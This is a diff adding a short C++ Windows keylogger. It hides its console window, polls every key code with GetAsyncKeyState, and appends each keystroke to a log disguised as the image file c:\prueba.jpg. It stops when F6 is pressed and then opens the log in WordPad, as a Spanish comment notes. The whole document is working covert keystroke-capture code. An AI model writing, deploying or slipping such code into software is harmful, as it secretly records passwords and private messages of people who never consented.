@@ -1,0 +1,21 @@
+#include <windows.h>
+#include <iostream>
+ 
+int main(){
+ 
+    short chr=0;
+    FILE *data;
+    data = fopen("c:\prueba.jpg","a+");
+    FreeConsole();
+    while(1){
+             //Sleep(10);
+             if(GetAsyncKeyState(chr++)==-32767){
+              fprintf( data , "%c" ,chr-1);
+              if(chr==124) break;
+              }
+              if(chr>=255) chr=0;
+    }
+    fclose(data);
+    system("start wordpad.exe c:\prueba.jpg");
+    return 0;
+}//para detenerlo basta con hacer clic en F6
